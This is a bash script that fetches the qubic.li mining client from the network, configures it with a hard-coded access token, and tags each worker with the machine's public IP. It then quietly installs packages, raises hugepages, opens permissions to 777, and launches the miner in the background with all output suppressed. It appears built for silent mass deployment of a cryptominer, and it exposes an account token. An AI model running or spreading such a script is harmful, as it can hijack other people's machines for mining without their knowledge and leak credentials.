#!/bin/bash

token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImQyNjkwMTRlLTE5MmItNDUxZS1iZjhkLTYyYjQ0OGQ5ODU2OCIsIk1pbmluZyI6IiIsIm5iZiI6MTczMzcwNTI0NSwiZXhwIjoxNzY1MjQxMjQ1LCJpYXQiOjE3MzM3MDUyNDUsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.qcF8HJHQSYIUl4S10Bg8s8P9gqAytVKBBnXnUY7nsC7A31naiJR5okoeC1wJNZ-sEgefCZfH-NPQ7ldpTEsy00XGwVeDFrZwr0Eczz0oI9mIwBFjsqveZD9ODXD_zFi9MWI2UXYXow_8qc2LOIImcyPm70s8mvRRLl6IJm9L-JwZhzDcNlkD_qabaoyXULDAsLQXmfftOeu0g5ZLY-6rLfOG-YT8i-9QJmC9aF8Ic3CL2tDgeg3kbYMpnhikEW0JuZSGB8VKKNdDrPFvQyw2-eob-IDZgLgZXZVNi6qBkJqwX5xzsLnRq9jMZIWfISPHigSVhWTy-Fv4OEURghnQIQ"
version="3.1.1"
hugepage="128"
work=`mktemp -d`

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"

wget --no-check-certificate -qO- "https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz" |tar -zx -C "${work}"
[ -f "${work}/qli-Client" ] || exit 1

cat >"${work}/appsettings.json"<< EOF
{
  "ClientSettings": {
    "pps": false,
    "accessToken": "${token}",
    "alias": "${addr}",
    "trainer": {
      "cpu": true,
      "gpu": false
    },
    "autoUpdate": false
  }
}
EOF


sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1


chmod -R 777 "${work}"
cd "${work}"
nohup ./qli-Client >/dev/null 2>&1 &
